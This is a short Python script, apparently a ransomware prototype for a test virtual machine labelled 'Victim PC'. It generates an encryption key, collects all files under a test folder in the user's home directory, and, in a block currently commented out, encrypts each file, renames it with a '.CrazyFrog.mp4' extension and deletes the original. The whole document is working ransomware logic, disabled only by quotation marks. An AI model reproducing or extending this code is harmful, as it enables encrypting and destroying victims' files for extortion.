#####VM part, Victim PC#####

from cryptography.fernet import Fernet
import os
import glob

homeDir = os.path.expanduser('~') #grabs user home directory
key = Fernet.generate_key()

with open("secret.key", "wb") as Enc_key:
    Enc_key.write(key)

files = glob.glob(f'{homeDir}\\ransomTest\\**\\*.*', recursive=True) #grabs files we want to enc
print(homeDir)
"""
fernet = Fernet(key)
for file in files:
    fileName = str(file)    ##added
    extension = os.path.splitext(file)[1]  ###gets all extensions
    
    
    with open(file, 'rb') as f:
        f_bytes=f.read()
    
    f_bytes_encrypted = fernet.encrypt(f_bytes)
    
    fileExtension = '.CrazyFrog.mp4'
    encFile = fileName + fileExtension  ##works
    
    with open(encFile, 'wb') as f:      ###changed file to encFile
        f.write(f_bytes_encrypted)
        os.remove(file) #added
"""